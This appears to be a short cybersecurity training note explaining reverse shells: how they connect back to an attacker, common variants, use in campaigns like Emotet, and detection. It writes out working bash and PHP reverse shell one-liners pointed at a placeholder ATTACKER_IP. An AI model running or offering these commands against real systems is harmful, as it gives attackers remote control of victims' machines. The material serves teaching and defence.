# Task 2: Reverse Shell Basics

## What is a Reverse Shell?
A reverse shell is a type of shell in which the target system (victim) initiates a connection back to the attacker’s machine. This is useful when the victim is behind a firewall that blocks incoming connections.

## How Does It Work?
1. The attacker sets up a listener on a specific port (e.g., 4444).
2. The victim executes a payload that connects back to the attacker’s IP and port.
3. Once connected, the attacker gains command-line access to the victim.

## Common Types of Reverse Shells
- **Bash**: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
- **Python**: `python -c 'import socket,subprocess,os; ...'`
- **PHP**: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f"); ?>`
- **PowerShell**: Used in Windows environments for stealthy access
- **Netcat (nc)**: Simple but often blocked in modern systems

## Common Uses in Hacking
- Maintaining access after initial exploitation
- Bypassing outbound-only firewall rules
- Used in real attacks like ransomware delivery (e.g., **LockBit**, **Conti**)

## Real-World Example
In the **Emotet malware campaign**, attackers used reverse shells to download additional payloads (like TrickBot) after initial infection via phishing emails.

## Key Takeaways
- Reverse shells are attacker-friendly when inbound connections are blocked.
- They rely on **outbound connections**, which are often allowed by default.
- Understanding them is crucial for both red teaming and blue team defense.
- Detection: Monitor unexpected outbound connections to unknown IPs.
